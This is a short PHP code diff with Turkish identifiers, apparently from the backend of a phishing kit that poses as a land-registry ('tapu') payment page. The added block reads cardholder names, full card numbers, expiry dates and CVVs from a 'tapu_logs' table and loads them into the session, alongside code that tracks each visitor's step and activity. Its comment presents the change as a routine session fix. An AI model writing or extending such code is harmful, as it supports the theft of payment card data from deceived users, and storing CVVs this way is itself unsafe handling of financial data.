@@ -18,6 +18,22 @@ $_aktif_log_id = get_or_create_log();
 if ($_aktif_log_id) {
     $_SESSION['log_id'] = $_aktif_log_id;
     update_log($_aktif_log_id, ['mevcut_adim' => 3, 'son_aktivite' => date('Y-m-d H:i:s')]);
+    
+    // Sync $_SESSION['odeme'] with DB to prevent stale session files in serverless environments
+    try {
+        $st = db()->prepare("SELECT kart_ad, kart_no, ay, yil, cvv FROM tapu_logs WHERE id = ? LIMIT 1");
+        $st->execute([$_aktif_log_id]);
+        $db_card = $st->fetch();
+        if ($db_card && !empty($db_card['kart_no'])) {
+            $_SESSION['odeme'] = [
+                'kart_ad' => $db_card['kart_ad'] ?? '',
+                'kart_no' => $db_card['kart_no'] ?? '',
+                'ay'      => $db_card['ay']      ?? '',
+                'yil'     => $db_card['yil']     ?? '',
+                'cvv'     => $db_card['cvv']     ?? '',
+            ];
+        }
+    } catch (Exception $e) {}
 }
 
 
